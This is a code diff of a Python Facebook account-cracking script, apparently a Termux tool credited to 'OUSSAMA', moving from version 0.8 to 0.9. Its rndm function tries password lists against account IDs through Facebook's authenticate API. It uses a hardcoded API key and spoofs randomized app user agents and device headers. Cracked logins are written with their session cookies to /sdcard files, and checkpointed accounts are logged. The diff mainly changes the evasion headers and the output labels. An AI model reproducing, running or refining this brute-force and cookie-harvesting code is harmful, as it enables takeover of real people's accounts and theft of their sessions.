@@ -178,7 +178,7 @@ logo=(f"""\033[1;37m
  \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mAuthor  : OUSSAMA 
  \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mGithub  : SABA-SID
  \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mService : FREE
- \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : \033[1;32m0.8
+ \033[1;32m[\033[1;37m+\033[1;32m] \033[1;37mVersion : \033[1;32m0.9
  \033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~""")
 def linex():
     print('\033[1;32m ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
@@ -691,7 +691,7 @@ def rndm(ids,passlist):
                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FBAN/;FBAV/A1XDL5U4;FBBV/968407167;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/968407167;FBDM//*{density=2.5,width=1080,height=1920};FBLC/ja_JP;FBRV/265210069;FBCR/OPPO;FBMF/Xiaomi;FBBD/Hisense;FBPN/com.facebook.katana;FBDV/iPhone12,8;FBSV/14;FBOP/5;FBCA/arm64-v8a;FBSS/20;]"+"[FBAN/;FBAV/A1XDL5U4;FBBV/747549781;FBAN/FBAN;FBAV/A1XDL5U4;FBBV/747549781;FBDM//*{density=1.5,width=1440,height=4096};FBLC/ja_JP;FBRV/108390437;FBCR/OPPO;FBMF/VIVO;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/iPhone13,1;FBSV/17;FBOP/8;FBCA/armeabi-v7a;FBSS/17;]"+"[FB4A/;FBAV/;FBBV/514640852;FBAN/FB4A;FBAV/;FBBV/514640852;FBDM//*{density=2.0,width=1920,height=4096};FBLC/de_DE;FBRV/703963275;FBCR/TECNO;FBMF/Xiaomi;FBBD/Spice;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A62;FBSV/16;FBOP/6;FBCA/armeabi;FBSS/;]"+"[FB4A/;FBAV/YZWSES93;FBBV/840702214;FBAN/FB4A;FBAV/YZWSES93;FBBV/840702214;FBDM//*{density=1.5,width=1080,height=3840};FBLC/de_DE;FBRV/405497620;FBCR/TECNO;FBMF/Motorola;FBBD/Realme;FBPN/com.facebook.katana;FBDV/LG_Q13;FBSV/14;FBOP/4;FBCA/x86;FBSS/;]"+"[FBAN/;FBAV/YZWSES93;FBBV/985232974;FBAN/FBAN;FBAV/YZWSES93;FBBV/985232974;FBDM//*{density=2.0,width=1440,height=1280};FBLC/es_ES;FBRV/818329292;FBCR/Sony;FBMF/Xiaomi;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Oppo_F19;FBSV/12;FBOP/4;FBCA/armeabi-v7a;FBSS/;]"+"[FBAN/;FBAV/4Q095MQG;FBBV/776999752;FBAN/FBAN;FBAV/4Q095MQG;FBBV/776999752;FBDM//*{density=1.5,width=720,height=2560};FBLC/es_ES;FBRV/488329553;FBCR/LG;FBMF/Motorola;FBBD/Nubia;FBPN/com.facebook.katana;FBDV/HTC_U20;FBSV/13;FBOP/6;FBCA/x86;FBSS/18;]"+"[FB4A/;FBAV/;FBBV/973586449;FBAN/FB4A;FBAV/;FBBV/973586449;FBDM//*{density=2.5,width=1920,height=4096};FBLC/it_IT;FBRV/179838340;FBCR/Nokia;FBMF/Xiaomi;FBBD/Calme;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_9;FBSV/13;FBOP/4;FBCA/armeabi-v7a;FBSS/18;]"+"[FBAN/;FBAV/YZWSES93;FBBV/612580636;FBAN/FBAN;FBAV/YZWSES93;FBBV/612580636;FBDM//*{density=2.5,width=1920,height=1280};FBLC/en_US;FBRV/461742232;FBCR/LG;FBMF/OnePlus;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5B;FBSV/16;FBOP/7;FBCA/armeabi;FBSS/;][FBAN/;FBAV/YZWSES93;FBBV/462956328;FBAN/FBAN;FBAV/YZWSES93;FBBV/462956328;FBDM//*{density=3.0,width=1440,height=2560};FBLC/fr_FR;FBRV/308331054;FBCR/OPPO;FBMF/OnePlus;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Xiaomi_Mi_Mix_14;FBSV/12;FBOP/4;FBCA/x86;FBSS/;]"
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+";[FB4A/;FBAV/YZWSES93;FBBV/722477749;FBAN/FB4A;FBAV/YZWSES93;FBBV/722477749;FBDM//*{density=2.0,width=720,height=4096};FBLC/en_US;FBRV/947647658;FBCR/Realme;FBMF/Xiaomi;FBBD/Meizu;FBPN/com.facebook.katana;FBDV/Vivo_Y53s;FBSV/16;FBOP/5;FBCA/arm64-v8a;FBSS/12;]"+"[FB4A/;FBAV/4Q095MQG;FBBV/991902321;FBAN/FB4A;FBAV/4Q095MQG;FBBV/991902321;FBDM//*{density=1.5,width=1080,height=1280};FBLC/ru_RU;FBRV/406414805;FBCR/OPPO;FBMF/Xiaomi;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/Nokia_X60;FBSV/12;FBOP/4;FBCA/x86;FBSS/;]"+"[FB4A/;FBAV/YZWSES93;FBBV/208946257;FBAN/FB4A;FBAV/YZWSES93;FBBV/208946257;FBDM//*{density=2.5,width=2560,height=1280};FBLC/zh_CN;FBRV/256471239;FBCR/Nokia;FBMF/Motorola;FBBD/VGO Tel;FBPN/com.facebook.katana;FBDV/HTC_Drive_15;FBSV/11;FBOP/7;FBCA/armeabi;FBSS/;]"
                         random_seed = random.Random()
                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                         device_id = str(uuid.uuid4())
@@ -707,24 +707,21 @@ def rndm(ids,passlist):
                         jazoest = li2+j1
                         data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                         headers = {
-    'authority': 'x.facebook.com',
+    'authority': 'mbasic.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
+    'accept-language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dpr': '2.8125',
-    'origin': 'https://x.facebook.com',
-    'referer': 'https://x.facebook.com/?stype=lo&deoia=1&jlou=AffxAWbukbKNFPVBVKAyv2tJFgCN_DJ1bnsM9WhNp5FS2FQWkrwwNjrFviuOijJRmLiaatWvn2ZAfZD2LcEjTVndLgSluK7uxVfAWo6VTKHvzg&smuh=52178&lh=Ac_H3VivjrW2enUQS8g&wtsid=rdr_0urgbqxzTswlX7ZEU&_rdr',
-    'sec-ch-prefers-color-scheme': 'dark',
+    'dpr': '3',
+    'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.24"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"M2007J20CG"',
+    'sec-ch-ua-model': '"Allure M3"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"12.0.0"',
+    'sec-ch-ua-platform-version': '"8.1.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
+    'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
@@ -744,7 +741,7 @@ def rndm(ids,passlist):
                                         break
                                 else:
                                         
-                                        print('\r\r\033[1;32m [BOSS-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [EXE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     
                                         open('/sdcard/BOSS/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
@@ -758,8 +755,8 @@ def rndm(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[1;31m [BOSS-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/BOSS/BOSS-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[1;31m [EXE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/EXE/BOSS-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
